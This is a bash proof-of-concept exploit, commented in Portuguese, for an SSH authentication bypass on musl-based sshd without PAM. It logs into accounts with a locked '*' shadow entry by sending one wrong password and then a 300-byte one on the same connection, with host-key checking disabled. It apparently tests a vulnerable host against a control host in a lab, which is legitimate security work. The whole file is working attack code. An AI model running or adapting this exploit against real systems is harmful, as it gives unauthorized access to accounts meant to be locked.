#!/usr/bin/env bash
# PoC do bypass descrito em sshhole.com.
# Conta com shadow "*" + sshd musl sem PAM: senha > 256 bytes autentica,
# desde que haja UMA tentativa falha antes na MESMA conexao (cache do pick_salt).
set -u

SSHOPTS=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
         -o PreferredAuthentications=password -o PubkeyAuthentication=no
         -o NumberOfPasswordPrompts=3 -o ConnectTimeout=5 -o LogLevel=ERROR)

report() { if [ "$1" -eq 0 ]; then echo "[+] $2: LOGIN OK -> $3"; else echo "[-] $2: negado (rc=$1)"; fi; }

# askpass.sh entrega: 1a senha curta/errada, 2a com 300 bytes.
attempt() {  # host user
  rm -f /tmp/askpass.count
  out=$(SSH_ASKPASS=/askpass.sh SSH_ASKPASS_REQUIRE=force DISPLAY=x \
        setsid ssh "${SSHOPTS[@]}" "$2@$1" 'echo OK as $(id -un) uid=$(id -u)' </dev/null 2>/dev/null)
  report "$?" "$1 $2 (shadow *)" "$out"
}

sleep 2
for h in alpine-vuln debian-ctrl; do
  echo "=== $h ==="
  attempt "$h" victim
done
